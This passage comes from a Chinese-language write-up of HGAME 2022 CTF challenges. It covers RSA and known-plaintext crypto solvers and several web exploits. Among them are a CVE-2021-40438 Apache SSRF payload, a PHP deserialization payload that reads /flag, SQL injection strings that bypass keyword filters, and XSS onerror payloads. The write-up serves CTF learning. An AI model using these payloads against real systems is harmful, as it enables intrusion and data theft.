id="饭卡的uno"><a href="#饭卡的uno" class="headerlink" title="饭卡的uno"></a>饭卡的uno</h3><p>不会iot，但是这个把附件拖了ida里就能看见flag</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/HGAME2022-wp/image-20220121173504075.png" alt="image-20220121173504075"></p><h2 id="CRYPTO"><a href="#CRYPTO" class="headerlink" title="CRYPTO"></a>CRYPTO</h2><h3 id="Easy-RSA"><a href="#Easy-RSA" class="headerlink" title="Easy RSA"></a>Easy RSA</h3><p>已知p，q，e和密文求明文的rsa</p><pre class="language-python" data-language="python"><code class="language-python">import libnumfrom Crypto.Util.number import long_to_bytesstring &#x3D; &#39;&#39;flag &#x3D; [(12433, 149, 197, 104), (8147, 131, 167, 6633), (10687, 211, 197, 35594), (19681, 131, 211, 15710), (33577, 251, 211, 38798), (30241, 157, 251, 35973), (293, 211, 157, 31548), (26459, 179, 149, 4778), (27479, 149, 223, 32728), (9029, 223, 137, 20696), (4649, 149, 151, 13418), (11783, 223, 251, 14239), (13537, 179, 137, 11702), (3835, 167, 139, 20051), (30983, 149, 227, 23928), (17581, 157, 131, 5855), (35381, 223, 179, 37774), (2357, 151, 223, 1849), (22649, 211, 229, 7348), (1151, 179, 223, 17982), (8431, 251, 163, 30226), (38501, 193, 211, 30559), (14549, 211, 151, 21143), (24781, 239, 241, 45604), (8051, 179, 131, 7994), (863, 181, 131, 11493), (1117, 239, 157, 12579), (7561, 149, 199, 8960), (19813, 239, 229, 53463), (4943, 131, 157, 14606), (29077, 191, 181, 33446), (18583, 211, 163, 31800), (30643, 173, 191, 27293), (11617, 223, 251, 13448), (19051, 191, 151, 21676), (18367, 179, 157, 14139), (18861, 149, 191, 5139), (9581, 211, 193, 25595)]for x in range(38):    c &#x3D; flag[x][3]    q &#x3D; flag[x][2]    p &#x3D; flag[x][1]    n &#x3D; p*q    e &#x3D; flag[x][0]    d &#x3D; libnum.invmod(e, (p - 1) * (q - 1))    m &#x3D; pow(c, d, n)      string +&#x3D; str(long_to_bytes(m),&#39;utf-8&#39;)print(string)</code></pre><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/HGAME2022-wp/image-20220121213332698.png" alt="image-20220121213332698"></p><h3 id="English-Novel"><a href="#English-Novel" class="headerlink" title="English Novel"></a>English Novel</h3><p>给了四个文件，一个小说原文，一个加密后的小说，一个加密脚本，一个flag密文</p><p>先根据小说原文里的标点通过Linux的grep命令看一下相对的密文</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/HGAME2022-wp/image-20220122003056261.png" alt="image-20220122003056261"></p><p>再根据加密脚本逆向写出求key的脚本，然后是求密文（真的好拉的编程</p><pre class="language-python" data-language="python"><code class="language-python">def encrypt(data, key):    #   assert len(data) &lt;&#x3D; len(key)    result &#x3D; &quot;&quot;    for i in range(len(data)):        if data[i].isupper():            result +&#x3D; chr((ord(data[i]) - ord(&#39;A&#39;) + key[i]) % 26 + ord(&#39;A&#39;))        elif data[i].islower():            result +&#x3D; chr((ord(data[i]) - ord(&#39;a&#39;) + key[i]) % 26 + ord(&#39;a&#39;))        else:            result +&#x3D; data[i]    return resultdef decrypt(result, key):    #   assert len(data) &lt;&#x3D; len(key)    data &#x3D; &quot;&quot;    for i in range(len(result)):        if result[i].isupper():            #result +&#x3D; chr((ord(data[i]) - ord(&#39;A&#39;) + key[i]) % 26 + ord(&#39;A&#39;))            for k in range(65,90):#python这个对负数求余真不知道怎么逆了，只能爆破了                result1 &#x3D; chr((k - ord(&#39;A&#39;) + key[i]) % 26 + ord(&#39;A&#39;))                if result1 &#x3D;&#x3D; result[i]:                    data +&#x3D; chr(k)        elif result[i].islower():            for k in range(96,123):                result1 &#x3D; chr((ord(chr(k)) - ord(&#39;a&#39;) + key[i]) % 26 + ord(&#39;a&#39;))                if result1 &#x3D;&#x3D; result[i]:                    data +&#x3D; chr(k)        else:            data +&#x3D; result[i]    print(data)def decryptkey(data1, result1):    keyboard &#x3D; []    for n in range(25):        for i in range(len(data1)):            if data[i].isupper():                # result +&#x3D; chr((ord(data[i]) - ord(&#39;A&#39;) + key[i]) % 26 + ord(&#39;A&#39;))                key &#x3D; str((ord(result1[i]) - ord(&#39;A&#39;) + (26 * n)) + ord(&#39;A&#39;) - ord(data1[i]))                keyboard.append(key)            elif data[i].islower():                key &#x3D; str((ord(result1[i]) - ord(&#39;a&#39;) + (26 * n)) + ord(&#39;a&#39;) - ord(data1[i]))                keyboard.append(key)            else:                key &#x3D; 0                keyboard.append(key)        n &#x3D; str(n)        for i in keyboard:            print(i, end&#x3D;&#39;,&#39;)        print(&#39;&#x2F;n&#39;)if __name__ &#x3D;&#x3D; &#39;__main__&#39;:    data &#x3D; &quot;&quot;&quot;urveying the ground, Snowball declared that this was just the place for a windmill&quot;&quot;&quot;#这里写原文    result &#x3D; &quot;klsyf&#123;W0_j0v_ca0z_&#39;Ks0ao-bln1qstxp_juqfqy&#39;?&#125;&quot;#这里写密文    a &#x3D; [3, 5, -8, 12, 1, -2, -7, 10, 0, -15, 1, 1, 0, 18, -13, -7, 3, 12, 20, 0, 0, -16, 4, 1, -17, 12, 0, 13, -4, 0, -1, 15, 0, -4, 25, -17, 1, -3, 0, -12, 14, 3, 3, 0, 0, 8, -8, 6, 0, 0, 21, 7, 0, -5, -20, -6, -17, 0, -6, 13, 8, 0,2, 1, 20, 20, -1, 0, 16, -10, -1, 0, 21, 0, -6, -5, 9, 18, 10, 16, 10, 5, 0, 0, 0, 6, -8, -1, 7, 0, 20, 9, 2, 3, -3]    #decryptkey(data, result)    decrypt(result, a)    #print(encrypt(data, a))</code></pre><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/HGAME2022-wp/image-20220122003437238.png" alt="image-20220122003437238"></p><p>这个flag在单引号里边的部分还是有点问题，可能是因为key的关系，但是由attfck能猜出attack，由pla1qtext能猜出plaintext，然后改完之后搜一下<img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/HGAME2022-wp/image-20220122003614141.png" alt="image-20220122003614141"></p><p>最终flag</p><p>hgame{D0_y0u_kn0w_&#39;Kn0wn-pla1ntext_attack&#39;?}</p><h1 id="第二周wp"><a href="#第二周wp" class="headerlink" title="第二周wp"></a>第二周wp</h1><h2 id="WEB-1"><a href="#WEB-1" class="headerlink" title="WEB"></a>WEB</h2><h3 id="Apache"><a href="#Apache" class="headerlink" title="Apache!*"></a>Apache!*</h3><p>有备份文件</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/HGAME2022-wp/image-20220205114347850.png" alt="image-20220205114347850"></p><p>根据题目描述应该是ssrf漏洞，结合apache版本能搜到CVE-2021-40438</p><pre class="language-none"><code class="language-none">?unix:AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA|http:&#x2F;&#x2F;internal.host&#x2F;</code></pre><p>但是网上的 exp 大多是 Apache 直接作为代理服务器的情况，这题给了 Apache 的配置文件 https-vhosts.conf , &#39;/&#39; 提供静态资源服务， &#39;/proxy&#39; 提供代理服务。</p><p>所以要在/proxy路径下用payload</p><h3 id="webpack-engine"><a href="#webpack-engine" class="headerlink" title="webpack-engine"></a>webpack-engine</h3><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/HGAME2022-wp/image-20220129140416825.png" alt="image-20220129140416825"></p><p>看源码，两次base64解码得到flag</p><pre class="language-none"><code class="language-none">hgame&#123;D0nt_f0r9et_2_ClOs3_S0urce_m@p&#125;</code></pre><h3 id="一本单词书"><a href="#一本单词书" class="headerlink" title="一本单词书"></a>一本单词书</h3><p>看源码有<a href="http://www.zip的提示/">www.zip的提示</a></p><p>代码审计一下</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/HGAME2022-wp/image-20220129140800363.png" alt="image-20220129140800363"></p><p>简单的用户判断</p><p>绕过之后</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/HGAME2022-wp/image-20220129140849923.png" alt="image-20220129140849923"></p><p>看index.php</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/HGAME2022-wp/image-20220129140911249.png" alt="image-20220129140911249"></p><p>大致逻辑就是将输入的传入get.php和save.php进行处理</p><p>save.php</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/HGAME2022-wp/image-20220129141059537.png" alt="image-20220129141059537"></p><p>将传入的单词的key和value写入文件中，并利用|来将key和value的序列化之后的值分隔。</p><p>get.php</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/HGAME2022-wp/image-20220129141542508.png" alt="image-20220129141542508"></p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/HGAME2022-wp/image-20220129141208348.png" alt="image-20220129141208348"></p><p>读取save.php中创建的文件的内容</p><p>evil.php</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/HGAME2022-wp/image-20220129141359385.png" alt="image-20220129141359385"></p><p>看见wakeup方法，再联系get.php时的unserialize可以猜测这里是要利用反序列化让file=/flag然后令flag变量的值变为flag再利用get.php将其读出来</p><p>这里要注意序列化的内容要在填在单词的位置，将其作为数组的key而不是value，否则在encode函数时会对value再进行一次序列化导致payload改变，无法执行反序列化操作</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/HGAME2022-wp/image-20220129184316177.png" alt="image-20220129184316177"></p><p>还要在反序列化的payload前添加|符号</p><p>让|后的部分执行decode函数中的反序列化</p><p>将evil类中的file赋值为/flag，从而让flag=/flag文件中的内容</p><p>这里的if过滤没啥用</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/HGAME2022-wp/image-20220129185352257.png" alt="image-20220129185352257"></p><p>最终payload</p><pre class="language-php" data-language="php"><code class="language-php">&#123;|O:4:&quot;Evil&quot;:2:&#123;s:4:&quot;file&quot;;s:4:&quot;flag&quot;;s:4:&quot;flag&quot;;N;&#125;</code></pre><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/HGAME2022-wp/image-20220129185511329.png" alt="image-20220129185511329"></p><h3 id="Pokemon"><a href="#Pokemon" class="headerlink" title="Pokemon"></a>Pokemon</h3><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/HGAME2022-wp/image-20220130223228959.png" alt="image-20220130223228959"></p><p>开始页面，源码里提示了个index?id=1</p><p>输到url上能看出来id的数决定了出现的是哪个精灵</p><p>当id不是1，2，3其中的数时会跳转到error.php</p><p>刚开始感觉是sql注入，注了半天这个页面没报错，这里id的值感觉是通过php的弱比较来判断的，开始怀疑是不是别的漏洞。</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/HGAME2022-wp/image-20220130223531260.png" alt="image-20220130223531260"></p><p>扫了一下扫到了db.php才确定就是sql注入</p><p>于是尝试在error界面注入</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/HGAME2022-wp/image-20220130223651689.png" alt="image-20220130223651689"></p><p>当code不为数字时会出现报错</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/HGAME2022-wp/image-20220130223713519.png" alt="image-20220130223713519"></p><p>刚开始没有给源码，试了好几次没试出来怎么注入</p><p>主办方给的源码：</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/HGAME2022-wp/image-20220130223751805.png" alt="image-20220130223751805"></p><p>有了源码之后就是一个很简单的联合注入了</p><p>括号或者/*x*/替代空格，用like替代等于，双写绕过关键字，因为是数字型注入，所以也不需要注释符</p><p>爆库名</p><pre class="language-none"><code class="language-none">?code&#x3D;1&#x2F;*x*&#x2F;ununionion&#x2F;*x*&#x2F;selselectect&#x2F;*x*&#x2F;1,database()</code></pre><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/HGAME2022-wp/image-20220130221501997.png" alt="image-20220130221501997"></p><pre class="language-none"><code class="language-none">?code&#x3D;-1&#x2F;*x*&#x2F;ununionion&#x2F;*x*&#x2F;selselectect&#x2F;*x*&#x2F;1,group_concat(table_name)frfromom(infoorrmation_schema.tables)whwhereere(table_schema)like&#39;pokemon&#39;</code></pre><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/HGAME2022-wp/image-20220130221833846.png" alt="image-20220130221833846"></p><pre class="language-none"><code class="language-none">?code&#x3D;-1&#x2F;*x*&#x2F;ununionion&#x2F;*x*&#x2F;selselectect&#x2F;*x*&#x2F;1,group_concat(column_name)frfromom(infoorrmation_schema.columns)whwhereere(table_name)like&#39;fllllllllaaaaaag&#39;</code></pre><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/HGAME2022-wp/image-20220130221937816.png" alt="image-20220130221937816"></p><pre class="language-none"><code class="language-none">?code&#x3D;-1&#x2F;*x*&#x2F;ununionion&#x2F;*x*&#x2F;selselectect&#x2F;*x*&#x2F;1,(flag)frfromom&#x2F;*x*&#x2F;fllllllllaaaaaa</code></pre><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/HGAME2022-wp/image-20220130222120527.png" alt="image-20220130222120527"></p><h3 id="At0m的留言板"><a href="#At0m的留言板" class="headerlink" title="At0m的留言板*"></a>At0m的留言板*</h3><p>xss漏洞</p><p>说起这个我就想起来b站那次的xss，还有我还没开始的js学习（</p><p>先试一下</p><pre class="language-none"><code class="language-none">&lt;script&gt;alert(1)&lt;&#x2F;script&gt;</code></pre><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/HGAME2022-wp/image-20220205121248714.png" alt="image-20220205121248714"></p><p>确定是xss</p><p>然后主办方给了个hint</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/HGAME2022-wp/image-20220211120719244.png" alt="image-20220211120719244"></p><p>输出用户留言位置的class标签名为content，然后还有一个用var定义的flag全局变量</p><p>为什么同样是两个变量，第一个使用let，而第二个使用var呢？因为使用 var 可 以利用 Object.keys(window) 拿到全局变量 flag 的变量名，而使用let的话无法获取。</p><p>也可以直接用Object.values(window)读取这些全局变量的内容，也就是直接获得flag</p><pre class="language-js" data-language="js"><code class="language-js"><span class="token operator">&lt;</span>img src<span class="token operator">=</span><span class="token number">1</span> onerror<span class="token operator">=</span><span class="token string">"document.getElementsByClassName('content')[0].innerHTML= Object.values(window)"</span><span class="token operator">></span></code></pre><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/HGAME2022-wp/image-20220211121033670.png" alt="image-20220211121033670"></p><p>由于提示里这个flag定义在了一个script标签里，我们也可以用document.scripts来读出script标签里的内容</p><pre class="language-none"><code class="language-none">&lt;img src&#x3D;1 onerror&#x3D;&quot;document.getElementsByClassName(&#39;content&#39;) [0].innerText&#x3D;document.scripts[0].text;&quot;&gt;</code></pre><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/HGAME2022-wp/image-20220211124302100.png" alt="image-20220211124302100"></p><h2 id="CRYPTO-1"><a href="#CRYPTO-1" class="headerlink" title="CRYPTO"></a>CRYPTO</h2><h3 id="RSA-Attack"><a href="#RSA-Attack" class="headerlink" title="RSA Attack"></a>RSA Attack</h3><p>rsa真是全套脚本就行</p><p>加密脚本</p><pre class="language-python" data-language="python"><code class="language-python">from Crypto.Util.number import getPrimefrom libnum import s2nfrom secret import flagm &#x3D; s2n(flag)e &#x3D; 65537p &#x3D; getPrime(80)q &#x3D; getPrime(80)n &#x3D; p * qc &#x3D; pow(m, e, n)print(&quot;e &#x3D;&quot;, e)print(&quot;n &#x3D;&quot;, n)print(&quot;c &#x3D;&quot;, c)</code></pre><p>正常的rsa加密，给了e，n，c求m</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/HGAME2022-wp/image-20220129190127418.png" alt="image-20220129190127418"></p><p>在线网站分解n得到pq</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/HGAME2022-wp/image-20220129190208787.png" alt="image-20220129190208787"></p><pre class="language-none"><code class="language-none">import gmpy2from libnum import n2sdef Decrypt(c, e, p, q):   L &#x3D; (p - 1) * (q - 1)   d &#x3D; gmpy2.invert(e, L)   n &#x3D; p * q   m &#x3D; gmpy2.powmod(c, d, n)   flag &#x3D; n2s(int(m)   print(flag)if __name__ &#x3D;&#x3D; &#39;__main__&#39;:   p &#x3D;  715800347513314032483037   q &#x3D;  978782023871716954857211   e &#x3D; 65537   c &#x3D; 122622425510870177715177368049049966519567512708   Decrypt(c, e, p, q)</code></pre><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/HGAME2022-wp/image-20220129190508606.png" alt="image-20220129190508606"></p><h3 id="RSA-Attack-2"><a href="#RSA-Attack-2" class="headerlink" title="RSA Attack 2"></a>RSA Attack 2</h3><p>加密脚本</p><pre class="language-none"><code class="language-none">import refrom math import ceilfrom Crypto.Util.number import getPrimefrom libnum import s2n#flag_parts &#x3D; list(map(s2n, re.findall(rf&quot;.&#123;&#123;,&#123;ceil(len(flag) &#x2F; 3)&#125;&#125;&#125;&quot;, flag)))print(&quot;# task1&quot;)m &#x3D; 42949244670170607238949839659191560916635942982341043413490558510e &#x3D; 65537p &#x3D; 118106171709518613190337380120721639096109433871758551481750559628607841525199933396401045857313841962667087681000077908575349856203197989280137518119610447265022793158335778819939567162786340083036604758380394175830091289942677310940962706354018362632488404102976344446903748276214668285468119214940392725123q &#x3D; 123715343521970684000128799876071042830570723218116931151467220244765055889417626806554868114525566978436323975083498703832794561493291312079691396671274837322036085911028636844643698862533724625315331567014898932701977758733187411738771617885153639118174062773966499612201555575923412045644028857989016603411r &#x3D; 169239143092963922213343686924677363088963485633027091645501151388482565490233323796889691624272664985173525812002355530484741432847170511348177065704338978754457533424010842217007432554862861949141613925946472939183705336155629494107050470952474816647080432002189309272835581148740211208678012416960136441833n1 &#x3D; p * qc1 &#x3D; pow(m, e, n1)n2 &#x3D; r * qc2 &#x3D; pow(m, e, n2)print(&quot;e &#x3D;&quot;, e)print(&quot;n1 &#x3D;&quot;, n1)print(&quot;c1 &#x3D;&quot;, c1)print(&quot;n2 &#x3D;&quot;, n2)print(&quot;c2 &#x3D;&quot;, c2)print(&quot;# task2&quot;)m &#x3D; 26926584401348540331333678102939069838976561137078484378892509505e &#x3D; 7p &#x3D; getPrime(1024)q &#x3D; getPrime(1024)n &#x3D; 14157878492255346300993349653813018105991884577529909522555551468374307942096214964604172734381913051273745228293930832314483466922529240958994897697475939867025561348042725919663546949015024693952641936481841552751484604123097148071800416608762258562797116583678332832015617217745966495992049762530373531163821979627361200921544223578170718741348242012164115593777700903954409103110092921578821048933346893212805071682235575813724113978341592885957767377587492202740185970828629767501662195356276862585025913615910839679860669917255271734413865211340126544199760628445054131661484184876679626946360753009512634349537c &#x3D; pow(m, e, n)print(&quot;e &#x3D;&quot;, e)print(&quot;n &#x3D;&quot;, n)print(&quot;c &#x3D;&quot;, c)print(&quot;# task3&quot;)m &#x3D; flag_parts[2]p &#x3D; getPrime(1024)q &#x3D; getPrime(1024)n &#x3D; p * qe1 &#x3D; getPrime(32)e2 &#x3D; getPrime(32)c1 &#x3D; pow(m, e1, n)c2 &#x3D; pow(m, e2, n)print(&quot;n &#x3D;&quot;, n)print(&quot;e1 &#x3D;&quot;, e1)print(&quot;c1 &#x3D;&quot;, c1)print(&quot;e2 &#x3D;&quot;, e2)print(&quot;c2 &#x3D;&quot;, c2)</code></pre><p>将flag分了三段后分别用了不同的加密方式</p><p><strong>第一段</strong></p><p>代码能看出n1和n2有共同的素因子，那么可以利用欧几里得算法直接将 n1 和 n2 分解。通过欧几里得算法可以直接求出 n1 和 n2 的最大公约数 p:</p><p>output给了e,n1,n2,c1,c2</p><pre class="language-none"><code class="language-none">def gcd(a, b):    if a &lt; b:        a, b &#x3D; b, a    while b !&#x3D; 0:        temp &#x3D; a % b        a &#x3D; b        b &#x3D; temp    return adef gcd_digui(a, b):    if b !&#x3D; 0:        return a    return gcd(b, a % b)n1 &#x3D; 14611545605107950827581005165327694782823188603151768169731431418361306231114985037775917461433925308054396970809690804073985835376464629860609710292181368600618626590498491850404503443414241455487304448344892337877422465715709154238653505141605904184985311873763495761345722155289457889686019746663293720106874227323699288277794292208957172446523420596391114891559537811029473150123641624108103676516754449492805126642552751278309634846777636042114135990516245907517377320190091400729277307636724890592155256437996566160995456743018225013851937593886086129131351582958811003596445806061492952513851932238563627194553n2 &#x3D; 20937478725109983803079185450449616567464596961348727453817249035110047585580142823551289577145958127121586792878509386085178452171112455890429474457797219202827030884262273061334752493496797935346631509806685589179618367453992749753318273834113016237120686880514110415113673431170488958730203963489455418967544128619234394915820392908422974075932751838012185542968842691824203206517795693893863945100661940988455695923511777306566419373394091907349431686646485516325575494902682337518438042711296437513221448397034813099279203955535025939120139680604495486980765910892438284945450733375156933863150808369796830892363p &#x3D; gcd(n1, n2)q &#x3D; n1&#x2F;&#x2F;pr &#x3D; n2&#x2F;&#x2F;pprint(p)print(q)print(r)</code></pre><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/HGAME2022-wp/image-20220129191322862.png" alt="image-20220129191322862"></p><pre class="language-none"><code class="language-none">p&#x3D;123715343521970684000128799876071042830570723218116931151467220244765055889417626806554868114525566978436323975083498703832794561493291312079691396671274837322036085911028636844643698862533724625315331567014898932701977758733187411738771617885153639118174062773966499612201555575923412045644028857989016603411q&#x3D;118106171709518613190337380120721639096109433871758551481750559628607841525199933396401045857313841962667087681000077908575349856203197989280137518119610447265022793158335778819939567162786340083036604758380394175830091289942677310940962706354018362632488404102976344446903748276214668285468119214940392725123r&#x3D;169239143092963922213343686924677363088963485633027091645501151388482565490233323796889691624272664985173525812002355530484741432847170511348177065704338978754457533424010842217007432554862861949141613925946472939183705336155629494107050470952474816647080432002189309272835581148740211208678012416960136441833</code></pre><p>这就相当于有了enc，带到前一个题的代码里得到</p><p>hgame{RsA@hAS!a&amp;VArIETY?of.</p><p><strong>第二段